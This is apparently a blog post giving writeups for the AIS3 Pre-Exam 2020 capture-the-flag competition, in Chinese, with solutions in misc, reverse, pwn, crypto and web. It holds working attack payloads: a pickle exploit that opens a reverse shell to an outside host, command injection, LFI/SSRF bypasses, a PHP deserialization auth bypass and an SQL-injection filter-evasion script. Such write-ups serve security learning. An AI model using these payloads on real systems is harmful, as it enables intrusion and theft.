---
title: "【Writeups】AIS3 pre-exam 2020"
date: 2020-06-09 22:29:00
categories:
- [security, writeups]
tags:
- ctf
- security
- writeups
---

這學期修了網路攻防實習，這堂課要用 AIS3 Pre-Exam 當期末考，好喔。

{% img /images/ais3-scores.png 500 'AIS3 Pre-Exam Scores' %}

[攻擊腳本們在這](https://github.com/OAlienO/CTF/tree/master/2020/AIS3-pre-exam)

## Misc

### Piquero

這題給了一張點字的圖，只要先找到出題者用的 generator [這個](https://www.mathsisfun.com/braille-translation.html)，接著就一個一個對照就解出來了。

```
AIS3{I_feel_sleepy_Good_Night!!!}
```

### Karuego

這題給了一張 png，先用 `binwalk --dd=".*" Karuego.png` 拉出一個 zip 檔，這個 zip 檔有加密，原本想用 `fcrackzip` 之類的爆破工具，但 `zsteg -a Karuego.png` 下去發現 LSB 有一段文字 `The key is : lafire`，zip 檔解開裡面有一張 `Demon.png` 打開就看到 flag 了。

```
AIS3{Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?}
```

### Soy

這題給了一張 png，是被墨漬污染的 QR Code，我用 `https://merricx.github.io/qrazybox/` 把已知的黑點白點都畫了上去就解出來了，因為大部分的 Data 區塊都沒被污染到吧，這個網站上畫 QR Code 的時候記得要畫白點，不要只畫黑點，沒畫的會是未知的灰點，我在這裡卡很久Q

```
AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}
```

### Saburo

這題要 `nc 60.250.197.227 11001`，沒給原始碼，連上去要輸入 flag 給他，他會輸出你幾秒後輸了

```
Flag: A
Haha, you lose in 24 milliseconds.
```

猜測是 Side Channel Attack，原始碼猜測大概是 ( 不負責任亂寫 code 如下 )

```python
import time

def compare(real_flag, user_flag):
    l = len(user_flag) if len(user_flag) < len(real_flag) else len(real_flag)
    for i in range(len(user_flag)):
        if user_flag[i] != real_flag[i]:
            return False
    return i == len(user_flag) - 1

real_flag = 'AIS3{...}'
user_flag = input()

start = time.clock()
win = compare(real_flag, user_flag)
end = time.clock()

if not win:
    print(f'Haha, you lose in {end - start} milliseconds.')
else:
    print(f'Oh, you win. QQ')
```

但是很多人在連線的時候去算 cpu time 會抖的很大力，所以後來 server 應該是改成用模擬的 ( 就比較穩了 )，就是錯了就加個 random 小 noise，對了就加一個大一點的值之類的。

所以每個字都爆搜 0 - 255，然後取最大的就好了，可以每次嘗試都送個十次取平均之類的，或是把 log 記起來，之後如果爆搜所有 byte 都沒有進展的話就，回去找第二高的，會比較穩。

```
AIS3{A1r1ght_U_4r3_my_3n3nnies}
```

### Shichirou

這題要 `nc 60.250.197.227 11000`，有給原始碼，給他一個 tar 檔，他幫你解開然後把解開的 `guess.txt` 跟 local 的 `flag.txt` 的 sha1 做比較，如果一樣的話就噴 flag。
tar 可以壓縮 symbolic link，自己做一個 symbolic link 指向 `flag.txt` 就完成了。

```bash
ln -s ../flag.txt guess.txt
tar -cf test.tar ./
```

```
AIS3{Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!}
```

### Clara

這題給了一個 pcap 檔，一開始啥提示都沒有，後來有說是 Malware 在 monitor 電腦然後傳 encrypted data 給 C&C Server，然後傳了兩次一樣的資料，看了老半天，會發現 tcp 流量裡面有類似 AIS3 的字樣，有兩大包 tcp，一包 10 MB 另一包 27 MB，加密的話大概也只有 xor 比較正常吧，所以複製了一些部分用 `xortool` 分析，找到 key 是 `AIS3{NO}`，而且看到 PNG 開頭的字樣和一些 xml 的 meta data，就可以確定假設正確也解對了(汗，既然兩次包的明文是一樣的那就把兩包做 xor 再 xor 上 `AIS3{NO}` 就得到另一包的 key 是 `xSECRETx`，接著把整包拿去做 xor 拉出圖片，圖片有好幾 MB 很大，一開始只有拉出一張圖片，某個動漫的圖，又卡了一下後，發現那包前面的部分有類似 header 的東西，他不是 8 的倍數，我一開始是直接不理他，但是猜測後面也有好幾段 header，讓 xor 沒對齊壞掉，所以我就把整段 data 暴力 shift 了幾次拿去 xor，就拉出所有照片了，其中一張有 flag，其他都垃圾，原本不知道有很多張圖片，也不知道 flag 在哪的時候還在開 `stegsolve` 和 `zsteg` 在圖片找 flag，浪費很多時間。
他的 packet 是很有秩序沒有亂傳的，header 裡面就是固定傳一個 `0xdeadbeeffaceb00c` 然後 C&C 把剛剛那段 xor 加密回傳，接著後面檔案名字的大小，和檔案名字，每個都分開傳，每個都自己做 xor cipher，接著就是傳 data，都沒有走歪或是掉進什麼坑的話還是有機會解出來的，我也不常分析 packet 也沒分析過什麼惡意程式，經驗不足所以解很久還要看 hint QQ

```
AIS3{T0y_t0Y_C4n_u_f1nd_A_n_yTh1ng_d3h1nb_nn3??}
```

## Reverse

### TsaiBro

這題給了一個 `ELF` 執行檔還有被加密的 flag 檔，被加密的 flag 檔的一小段大概長下面這樣

`發財..發財.......發財....發財.......發財....發財.發財........`

隨便用 ida 看了一下後，加密流程就是把 flag 轉乘 `flag // 8` 和 `flag % 8`，然後數字是多少就轉乘多少個點，所以最多 8 個點，上面那段就是 `[2, 7, 4, 7, 4, 1, 8]`，那解密就反過來組回去就好。

```
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
```

### Fallen Beat

這題給了一隻 jar 執行檔，跑起來是一個節奏遊戲，要 Full Combo 才能拿到 flag，那直接 `JD-GUI` 下去看他，關鍵在 `PanelEnding.class` 裡面，定義了被加密的 flag 陣列，還有後面做 xor 解回 flag 印出來的部分

```java
byte[] flag = new byte[] { 
    89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 
    109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 
    111, 119, 111, 71, 114, 125, 68, 105, Byte.MAX_VALUE, 124, 
    94, 103, 46, 107, 97, 104 };
```

```java
if (t == mc) {
    for (i = 0; i < cache.size(); i++)
        this.flag[i % this.flag.length] = (byte)(this.flag[i % this.flag.length] ^ ((Integer)cache.get(i)).intValue());
    String fff = new String(this.flag);
    this.text[0].setText(String.format("Flag: %s", new Object[] { fff }));
} 
```

這裡的 cache 原本以為是內建的東東，結果不是，追了一下發現在 `GameControl.class` 有定義，東西是從 `songs/gekkou/hell.txt` 抓出來的，那就直接照著 xor 就解出來了。

```
AIS3{Wow_how_m4ny_h4nds_do_you_h4ve}
```

### Stand up!Brain

這題給了一個 `ELF` 執行檔，隨便看了一下發現他實做了 Brainfuck，然後程式碼在執行檔裡面，拉出來長這樣

```
-------------------------------------------------------------------[>[-]<[-]]>[>--------------------------------------------------------[>[-]<[-]]>[>-------------------------------------------------------[>[-]<[-]]>[>------------------------------------------------------[>[-]<[-]]>[>---------------------------------------------------[>[-]<[-]]>[>---------------------------------[>[-]<[-]]>[>>----[---->+<]>++.++++++++.++++++++++.>-[----->+<]>.+[--->++<]>+++.>-[--->+<]>-.[---->+++++<]>-.[-->+<]>---.[--->++<]>---.++[->+++<]>.+[-->+<]>+.[--->++<]>---.++[->+++<]>.+++.[--->+<]>----.[-->+<]>-----.[->++<]>+.-[---->+++<]>.--------.>-[--->+<]>.-[----->+<]>-.++++++++.--[----->+++<]>.+++.[--->+<]>-.-[-->+<]>---.++[--->+++++<]>.++++++++++++++.+++[->+++++<]>.[----->+<]>++.>-[----->+<]>.---[->++<]>-.++++++.[--->+<]>+++.+++.[-]]]]]]]
```

人腦跑了一下發現前面一段是在做很多 if 判斷，後面有 `.` 的部分是印 flag 的部分。

```
# if (ptr[0] - 67) == 0
-------------------------------------------------------------------[>[-]<[-]]>
[
    # if (ptr[2] - 56) == 0
    >--------------------------------------------------------[>[-]<[-]]>
    [
        # if (ptr[4] - 55) == 0
        >-------------------------------------------------------[>[-]<[-]]>
        [
            # if (ptr[6] - 54) == 0
            >------------------------------------------------------[>[-]<[-]]>
            [
                # if (ptr[8] - 51) == 0
                >---------------------------------------------------[>[-]<[-]]>
                [
                    # if (ptr[8] - 33) == 0
                    >---------------------------------[>[-]<[-]]>
```

所以只要你的輸入要是 `C8763!` 就會進到後面印 flag 的部分，所以可以直接執行原本的程式輸入 `C8763!` 跟桐人一起使出星爆氣流斬拿 flag，或是直接忽略前面把後面那段貼到線上的 Brainfuck Compiler 執行一下也可以拿到 flag。

```
AIS3{Th1s_1s_br4iNFUCK_bu7_m0r3_ez}
```

### Long Island Iced Tea

這題給了一個 `ELF` 執行檔還有被加密的 flag 檔，被加密的 flag 長這樣

```
850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000
```

隨便嘗試了一下發現超過 8 個 bytes 之後的都不會變而且直接是明文了，把上面那段從 hex 轉回 bytes 就變成

```
\x85\n*M?\xac\x14\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__}\x00\x00\x00\x00\x00\x00\x00\x00
```

前面 8 個 bytes 已知 `AIS3{` 5 個字了，所以直接爆搜剩下 3 個字。

```
AIS3{A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__}
```

### La vie en rose

這題給了給 `PE` 的執行檔，原本以為要逆向 windows 了，打開後看到一堆 python 的函式庫還有 tkinter，發現他是用 PyInstaller 包的，參考 [這篇](http://o1o1o1o1o.blogspot.com/2016/11/python-pyinstaller-reverse-engineer.html) 用官方的 [archive_viewer.py](https://github.com/pyinstaller/pyinstaller/blob/develop/archive_viewer.py) 把 pyc 拉出來 ( 其實好像是 pyd 檔才對，好像格式上差了一點 )，在逆 pyc 的時候確定版本很重要，拉出來的 pyc 沒有 magic value header，可以隨便再撈個比如 `pyimod01_os_path` 出來，這個就有 magic value 是 `550d 0d0a`，所以是 Python 3.8 b4 版，先嘗試用了一下 `uncompyle6` 去還原原始碼，可是他噴錯然後失敗了，那我們就直接看 bytecode 吧，用 `marshal.loads` 載入為 code object 再用 `dis.dis` 去 disassemble，邊猜他的原始碼，可以邊用 `dis.dis(compile('x = 1', 'filename', 'exec'))` 去驗證，看了一下會發現

```python
flag = "".join(map(chr, [secret[i] ^ notes[i % len(notes)] for i in range(len(secret))]))
```

`flag` 是用 `secret` 和 `notes` xor 出來的，`secret` 是寫死的，`notes` 是從 `input` 輸入進來的，然後做了下面的計算算出 `result`

```python
notes = list(map(ord, notes))
for i in range(len(notes) - 1):
    result.append(notes[i] + notes[i+1])
for i in range(len(notes) - 1):
    result.append(notes[i] - notes[i+1])
```

最後把 `result` 跟一個固定的陣列做比較，所以我們有 `a+b` 和 `a-b` 只要把兩個加起來除以二就拿到 `a` 了，把 `notes` 還原再跟 `secret` xor 就得到 `flag` 了。

```
AIS3{th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan}
```

### Uroboros

這題給了一個 `ELF` 執行檔，是 C++ 寫的，總之就逆他，發現他是一個 circular double linked list，結構就像下面這樣很普通。

```c++
struct Node { 
    struct Node* prev;
    struct Node* next;
    int data;
};
```

總共有 314 個 Node，對輸入的每個字，他會先往下走 **輸入的字乘上 7** 次然後把走到的那個 Node 的值乘 64 加上 counter，counter 就是一開始是 1，每經過一個字加一，最後把整段輸出跟某個答案比較，對了就代表你的輸入就是 flag，所以就照著解回來，把數字當成 64 進位拆開，比如第 141 個 Node 存的 `70` 拆成 `64 * 1 + 6`，代表第一個和第六個字是 'A'，因為 `ord('A') * 7 = 141 ( mod 341 )`，就是把 `141 * inverse(7, 341) = 65 = ord('A')`，就這樣。

```
AIS3{4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy}
```

## Pwn

### BOF

最簡單的 buffer overflow，裡面已經有一個函式，直接呼叫就拿到 shell 了，但是記得要跳到 `push rbp` 下一行，如果跳到 `push rbp` 的話 stack 會沒有對齊 16 的倍數，做 `system` 的時候會進到 child thread 然後跑到 `movaps XMMWORD PTR [rsp+0x40], xmm0` 因為沒對齊就掛了，然後 child thread 死掉 `system` 就會執行完跳出來 ( 都還沒打到指令 )，出來跑到函式結尾 `return` 的時候又會掛掉，因為正常呼叫函式都會把 return address 放到 stack 上，但是直接跳過去就沒有放，他就會 return 到奇怪的位置。

```
AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}
```

### Nonsense

這題讓我們輸入 shellcode，然後會檢查 shellcode 裡面有沒有 `wubbalubbadubdub` 這段字，並且在這段字前面的每個字都要小於等於 31，而找到那段字之後就會直接跳出檢查函式，所以那段字的後面都不會被檢查了，那我們的 shellcode 就構造成最開頭先 `ja` 跳到後面真正的 shellcode，然後中間放 `wubbalubbadubdub`，就完成了。

```
ja shellcode
... (some padding instructions)
wubbalubbadubdub
shellcode:
...
```

```
AIS3{Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!}
```

### Portal Gun

這題就是用 `gets` 的 bof，有一個函式有用到 `system('sh')`，但是他有 `LD_PRELOAD` 一個 `hook.so` 裡面把 `system` hook 掉了，所以不能直接叫，那就堆 ROP leak libc address 再自己跳進去 system 吧。

```
AIS3{U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o}
```

### Morty School

這題一開始就給你 leak libc address 給你，接下來你可以挑一個 Morty 教，但你給的 index 他沒有檢查，所以可以任意寫一個位址，但是不是直接寫值上去，而是寫到你給他的位址裡面放的位址裡面的值，所以找一下哪裡有存 `__stack_chk_fail` got 的位址，利用他去寫 `__stack_chk_fail` 的 got 改成我們串好的 ROP gadgets，然後寫爆 stack（ 因為這裡也有 overflow ），就跳去做 ROP 了，一開始有想直接跳 one gadgets 但是條件都不符，所以就自己做 ROP 做 `system('/bin/sh')`。

```
AIS3{s7ay_At_h0ME_And_Keep_$Oc1@L_D1$T4Nc3,M0rTyS}
```

### Death Crystal

這題是 format string，但是有檢查輸入，所有字都不能有 `$`, `\`, `/`, `^`，並且 `%` 後面都不能有 `c`, `p`, `n`, `h`，主要是不能用 `$` 去指定參數，但沒關係就多放幾個 padding 用的把參數推過去就好了，他的 `flag` 已經讀進來放到 `0x202060` 了，但是 PIE 有開所以還是要 leak 一下 code base address，要繞過檢查只要前面隨便放個數字就好了，比如 `%1p`，先 `b'%1p' * 11 + b';%1p'` leak 出 code base address，然後再 `b'%d' * 8 + b'%100sAA\x00' + p64(base + 0x202060)` 就拿到 flag 了。

```
AIS3{FOrM@T_5TRin6_15_$o0o_pOw3rFul_And_eAsY}
```

### Meeseeks Box

這題是 heap 題，很一般的有 `create`, `show`, `delete` 的題目，然後沒什麼檢查，而且是 ubuntu 18.04 有 tcache 可以用，所以先弄個夠大的 chunk 然後 free 掉他讓他進到 unsorted bins 就可以拿 libc address 了，然後有 tcache 可以隨便 double free 他去把 `__malloc_hook` 寫成 one gadget 的位址就完成了。

```
AIS3{G0D_d4mn!_Mr._M3e5EEk5_g1V3S_Y0U_@_sH31l}
```

## Crypto

### Brontosaurus

給了一個檔案叫 `KcufsJ` 裡面是 jsfuck 混淆過的 js code，他的檔名就是倒過來的 jsfuck，所以內容也要倒過來，開瀏覽器 console 執行一下就好了。

```
AIS3{Br0n7Os4uru5_ch3at_3asi1Y}
```

### T-Rex

```
         !       @       #       $       %       &

 !       V       F       Y       J       6       1

 @       5       0       M       2       9       L

 #       I       W       H       S       4       Q

 $       K       G       B       X       T       A

 %       E       3       C       7       P       N

 &       U       Z       8       R       D       O

&$ !# $# @% { %$ #! $& %# &% &% @@ $# %# !& $& !& !@ _ $& @% $$ _ @$ !# !! @% _ #! @@ !& _ $# && #@ !% %$ ## ! # &% @$ _ $& &$ &% %& && #@ _ !@ %$ %& %! $$ &# !# !! &% @% ## $% !% !& @! #& && %& !% %$ %# %$ @% ## %@ @@ $%  ## !& #% %! %@ &@ %! &@ %$ $# ## %# !$ &% @% !% !& $& &% %# %@ #$ !# && !& #! %! ## #$ @! #% !! $! $& @& %% @ @ && #& @% @! @# #@ @@ @& !@ %@ !# !# $# $! !@ &$ $@ !! @! &# @$ &! &# $! @@ &@ !% #% #! &@ &$ @@ &$ &! !& #! !# ## %$ !# !# %$ &! !# @# ## @@ $! $$ %# %$ @% @& $! &! !$ $# #$ $& #@ %@ @$ !% %& %! @% #% $! !! #$ &# ## &#  && $& !! !% $! @& !% &@ !& $! @# !@ !& @$ $% #& #$ %@ %% %% &! $# !# $& #@ &! !# @! !@ @@ @@ ## !@ $@ !& $# % & %% !# !! $& !$ $% !! @$ @& !& &@ #$ && @% $& $& !% &! && &@ &% @$ &% &$ &@ $$ }
```

給了一張表和密文，對表轉回去就好了，但要注意 row 和 column 的順序，`&$` 是 A 不是 R。

### Octopus

這題給 python script 和他執行後的 output，裡面在做 [BB84 量子密鑰分發](https://en.wikipedia.org/wiki/Quantum_key_distribution#BB84_protocol:_Charles_H._Bennett_and_Gilles_Brassard_(1984))，兩邊的 Basis 都給了，Qubits 也給了，就是把 Basis 一樣部分的那些 Qubits 抓出來轉回 binary 就好了。

```
AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}
```

### Blowfish

這題要 `nc 60.250.197.227 12001`，有給原始碼，還有一個 python pickle dump 的檔案

```
[{'name': 'maojui', 'password': 'SECRET', 'admin': False}, {'name': 'djosix', 'password': 'S3crE7', 'admin': False}, {'name': 'kaibro', 'password': 'GGInIn', 'admin': False}, {'name': 'others', 'password': '_FLAG_', 'admin': False}]
```

連上去之後，他會給你這段用 Blowfish 的 CTR Mode 加密的結果當作 token，接著你就可以再把 token 丟回去給他解密，他會看你是不是 admin，因為是 CTR Mode 所以就翻一下 bit 就好了，把那個 False 的部分翻成 True，就這麼簡單。
詳情可以參考 [這份投影片](https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf) Bit-Flipping Attack 的部分。

```
AIS3{ATk_BloWf1sH-CTR_by_b1t_Flipping_^_^}
```

### Camel

這題給了 sage script，裡面有一個 Elliptic Curve，並給了上面的 9 個點，flag 就是 Elliptic Curve 的參數，因為他給的點的 x 座標都是 $p-1, p+1, p+2, ...$，所以帶進 $y^2 = x^3 + a x + b$ 式子 mod p 之後 p 就都不見了

$$
\begin{align}
&(p-1)^3 + a (p-1) + b = -1 - a + b \pmod{p} \\\\
&(p+1)^3 + a (p+1) + b = 1 + a + b \pmod{p}
\end{align}
$$

上面兩式相加之後可以得到 `2b`，還有其他兩組 `p+3`, `p-3`, `p+5`, `p-5` 也是同樣的情況，所以我們可以拿到三組 `2b + kp` 這樣形式的東西，把他們互減去做 gcd 就得到 `p` 了，有 `p` 之後就帶回去就可以得到 `a, b`。

```
AIS3{Curv3_Mak3_M3_Th1nK_Ab0Ut_CaME1_A_P}
```

### Turtle

這題就是 Padding Oracle Attack，我把以前的 script 拿出來然後把 oracle 換成用 requests 去抓就完成了。
詳情可以參考 [這份投影片](https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf) Padding Oracle Attack 的部分。

```
AIS3{5l0w_4nd_5734dy_w1n5_7h3_r4c3.}
```

## Web

### Squirrel

這題網站在 https://squirrel.ais3.org/，打開看一下流量會看到有一個請求是 `/api.php?get=/etc/passwd`，看起來是直接給你 local file inclusion，抓一下網站原始碼 `/api.php?get=/var/www/html/api.php`

```php
<?php

header('Content-Type: application\/json');

if ($file = @$_GET['get']) {
    $output = shell_exec("cat '$file'");

    if ($output !== null) {
        echo json_encode([
            'output' => $output
        ]);
    } else {
        echo json_encode([
            'error' => 'cannot get file'
        ]);
    }
} else {
    echo json_encode([
        'error' => 'empty file path'
    ]);
}
```

看起來是 command injection，`/api.php?get='|bash -c 'ls` 就可以執行任意 command 了，`ls /` 看根目錄有個 `5qu1rr3l_15_4_k1nd_0f_b16_r47.txt` 裡面就是 flag 了 ( 剛好檔名跟 flag 一樣，真佛心 )

```
AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}
```

### Shark

這題網站在 https://shark.ais3.org/，首頁有個連結點下去就是 `/?path=hint.txt`，又是 local file inclusion，但是 hint 說

```
Please find the other server in the internal network! (flag is on that server)

    GET http://some-internal-server/flag
```

那就先看一下原始碼 `/?path=/var/www/html/index.php`，直接看會拿到 `[forbidden]`，那隨便繞一下 `/?path=file:///var/www/html/index.php`

```php
<?php

    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }

?><!DOCTYPE html>
<head>
    <title>🦈🦈🦈</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>🦈🦈🦈</h1>
    <a href="?path=hint.txt">Shark never cries?</a>
</body>
```

有用 regex 檢查開頭不能是 `.` 和 `/`，所以 `file://` 或 `php://filter/read=convert.base64-encode/resource=` 都可以繞，再來看 `/?path=file:///etc/hosts`

```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.22.0.3	02b23467485e
```

瀏覽一下 `/?path=http://02b23467485e` 發現是本機，那就找找子網路下的鄰居們，就找到 `/?path=http://172.22.0.2/flag`

```
AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}
```

### Elephant

這題網站在 https://elephant.ais3.org/，首頁可以登入，隨便輸入個 username 就登入了不需要密碼，第一步當然是找找有沒有原始碼，看了一下 `robots.txt` 沒東西，再看 `.git` 是 Forbidden，中獎，隨便找個 GitDumper 把 `.git` 抓下來，`git log` 看到前一個 commit 把原始碼刪掉了，`git reset --hard` 回去，原始碼如下

```php
<?php

const SESSION = 'elephant_user';
$flag = file_get_contents('/flag');


class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = md5($_SERVER['REMOTE_ADDR'] . rand());
    }

    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}

if (isset($_GET['logout'])) {
    header('Location: /');
    setcookie(SESSION, NULL, 0);
    exit;
}


$user = NULL;

if ($name = $_POST['name']) {
    $user = new User($name);
    header('Location: /');
    setcookie(SESSION, base64_encode(serialize($user)), time() + 600);
    exit;
} else if ($data = @$_COOKIE[SESSION]) {
    $user = unserialize(base64_decode($data));
}



?><!DOCTYPE html>
<head>
    <title>Elephant</title>
    <meta charset='utf-8'>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
    <?php if (!$user): ?>
        <div id="login">
            <h3 class="text-center text-white pt-5">Are you familiar with PHP?</h3>
            <div class="container">
                <div id="login-row" class="row justify-content-center align-items-center">
                    <div id="login-column" class="col-md-6">
                        <div id="login-box" class="col-md-12">
                            <form id="login-form" class="form" action="" method="post">
                                <h3 class="text-center text-info">What's your name!?</h3>
                                <div class="form-group">
                                    <label for="name" class="text-info">Name:</label><br>
                                    <input type="text" name="name" id="name" class="form-control">
                                </div>
                                <div class="form-group">
                                    <input type="submit" name="submit" class="btn btn-info btn-md" value="let me in">
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    <?php else: ?>
        <h3 class="text-center text-white pt-5">You may want to read the source code.</h3>
        <div class="container" style="text-align: center">
            <img src="images/elephant2.png">
        </div>
        <hr>
        <div class="container">
            <div class="row justify-content-center align-items-center">
                <div class="col-md-6">
                    <div class="col-md-12">
                        <h3 class="text-center text-info">Do you know?</h3>
                        <h3 class="text-center text-info">PHP's mascot is an elephant!</h3>
                        Hello, <b><?= $user->name ?></b>!
                        <?php if ($user->canReadFlag()): ?>
                            This is your flag: <b><?= $flag ?></b>
                        <?php else: ?>
                            Your token is not sufficient to read the flag!
                        <?php endif; ?>
                        <a href="?logout">Logout!</a>
                    </div>
                </div>
            </div>
        </div>
    <?php endif ?>
</body>
```

只要讓 `strcmp($flag, $this->token) == 0` 就好啦，那 `strcmp` 已知的問題就是他 compare 陣列隨然會噴 Warning，但結果會是 `NULL`，而這裡是用兩個 `=` 不是三個，所以 `NULL == 0`，把下面這段 base64 encode 後放回 Cookie 就完成啦。

```
O:4:"User":2:{s:4:"name";s:1:"a";s:11:"\x00User\x00token";a:0:{}}
```

```
AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}
```

### Snake

這題網站在 https://snake.ais3.org/ ，首頁就是原始碼了

```python
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')
    
    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)
            
            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()
        
    return open(__file__).read()
```

給他 data，他會 `pickle.loads`，沒有任何檢查，所以直接 reverse shell

```python
import os
import pickle
from base64 import *

class Exploit:
    def __reduce__(self):
        return(os.system, (('bash -c "bash -i >& /dev/tcp/1.2.3.4/9999 0>&1"'),))

ex = Exploit()
print(b64decode(pickle.dumps(ex)))
```

```
AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}
```

### Owl

這題網站在 https://turtowl.ais3.org/，首頁有登入頁面，他有個白色字寫 `GUESS THE STUPID USERNAME / PASSWORD`，猜 `admin/admin` 就登進去了，登進去後，又有個白色字按鈕寫 `SHOW HINT`，點下去就看到原始碼了

```php
<?php

    if (isset($_GET['source'])) {
        highlight_file(__FILE__);
        exit;
    }

    // Settings
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    date_default_timezone_set('Asia/Taipei');
    session_start();

    // CSRF
    if (!isset($_SESSION['csrf_key']))
        $_SESSION['csrf_key'] = md5(rand() * rand());
    require_once('csrf.php');
    $csrf = new Csrf($_SESSION['csrf_key']);


    if ($action = @$_GET['action']) {
        function redirect($path = '/', $message = null) {
            $alert = $message ? 'alert(' . json_encode($message) . ')' : '';
            $path = json_encode($path);
            die("<script>$alert; document.location.replace($path);</script>");
        }

        if ($action === 'logout') {
            unset($_SESSION['user']);
            redirect('/');
        }
        else if ($action === 'login') {
            // Validate CSRF token
            $token = @$_POST['csrf_token'];
            if (!$token || !$csrf->validate($token)) {
                redirect('/', 'invalid csrf_token');
            }

            // Check if username and password are given
            $username = @$_POST['username'];
            $password = @$_POST['password'];
            if (!$username || !$password) {
                redirect('/', 'username and password should not be empty');
            }

            // Get rid of sqlmap kiddies
            if (stripos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') !== false) {
                redirect('/', "sqlmap is child's play");
            }

            // Get rid of you
            $bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
            $username = str_ireplace($bad, '', $username);
            $username = str_ireplace($bad, '', $username);

            // Auth
            $hash = md5($password);
            $row = (new SQLite3('/db.sqlite3'))
                ->querySingle("SELECT * FROM users WHERE username = '$username' AND password = '$hash'", true);
            if (!$row) {
                redirect('/', 'login failed');
            }

            $_SESSION['user'] = $row['username'];
            redirect('/');
        }
        else {
            redirect('/', "unknown action: $action");
        }
    }

    $user = @$_SESSION['user'];

?><!DOCTYPE html>
<head>
    <title>🦉🦉🦉🦉</title>
    <meta charset='utf-8'>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
    <?php if (!$user): ?>
        <div id="login">
            <h3 class="text-center text-white pt-5">GUESS THE STUPID USERNAME / PASSWORD</h3>
            <div class="container">
                <div id="login-row" class="row justify-content-center align-items-center">
                    <div id="login-column" class="col-md-6">
                        <div id="login-box" class="col-md-12">
                            <form id="login-form" class="form" action="?action=login" method="post">
                                <input type="hidden" name="csrf_token" value="<?= htmlentities($csrf->generate()) ?>">
                                <h3 class="text-center text-info">🦉: "Login to see cool things!"</h3>
                                <div class="form-group">
                                    <label for="name" class="text-info">Username:</label><br>
                                    <input type="text" name="username" id="username" class="form-control"><br>
                                    <label for="name" class="text-info">Password:</label><br>
                                    <input type="text" name="password" id="password" class="form-control"><br>
                                </div>
                                <div class="form-group">
                                    <input type="submit" name="submit" class="btn btn-info btn-md" value="Login">
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    <?php else: ?>
        <h3 class="text-center text-white pt-5"><a style="color: white" href="/?source">SHOW HINT</a></h3>
        <div class="container">
            <div class="row justify-content-center align-items-center">
                <div class="col-md-6">
                    <div class="col-md-12">
                        <h3 class="text-center text-info">Nothing</h3>
                        Hello, <b><?= htmlentities($user) ?></b>, nothing here.
                        <a href="?action=logout">Logout!</a>
                    </div>
                </div>
            </div>
        </div>
    <?php endif ?>
</body>
```

就是 sqlite 的 SQL Injection，輸入的 username 會用 `str_ireplace` 過濾兩次，很好繞過，打 `///***` 就會被過濾成 `/*`，打 `selselselectectect` 就會被過濾成 `select`，所以寫個簡單的 script 自動轉換 payload

```python
 import sys

 table = {
     ' ': '/**/',
     '/*': '///***',
     '*/': '***///',
     'union': 'unununionionion',
     'select': 'selselselectectect',
     'and': 'anananddd',
     'or': 'ooorrr',
     'where': 'whewhewhererere',
     'from': 'frfrfromomom',
 }

 inp = sys.argv[1]
 for t,v in table.items():
     inp = inp.replace(t, v)
 print(inp)
```

注意到 `--` 還是沒辦法用，因為 `-selselectect-` 會被轉成空的，`select` 順序在 `--` 前面會先被過濾掉，`str_ireplace` 是照著 list 一個個 replace 的，不過我們用 `/*` 就足夠了。

```
